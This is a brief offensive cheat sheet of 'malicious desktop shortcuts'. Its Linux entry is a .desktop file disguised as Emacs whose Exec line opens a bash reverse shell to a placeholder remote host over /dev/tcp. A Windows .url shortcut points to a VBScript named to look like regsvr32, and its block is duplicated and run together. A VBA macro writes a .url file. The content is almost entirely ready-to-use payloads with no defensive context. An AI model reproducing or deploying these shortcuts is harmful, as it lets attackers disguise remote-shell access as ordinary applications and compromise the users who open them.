# Malicious Desktop Shortcuts

## Linux

```
[Desktop Entry]
Name=Emacs
Exec=/bin/bash -i >& /dev/tcp/[RHOST]/[RPORT] 0>&1
Icon=http://bit.ly/icon-png
Terminal=false
Type=Application
```

## Windows

```
[InternetShortcut]
URL=file:///C:\Users\user\AppData\Roaming\forfiles\regsvr32.vbs[InternetShortcut]
URL=file:///C:\Users\user\AppData\Roaming\forfiles\regsvr32.vbs
```

## Excel Sheet Macro `mailto:`

```
Private Sub Form_Load()
Open "C:\mail.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=mailto:example@example.com"
Print #1, "IconIndex = 0"
Print #1, "IconFile=C:\WINDOWS\explorer.exe"
Close #1
End Sub
```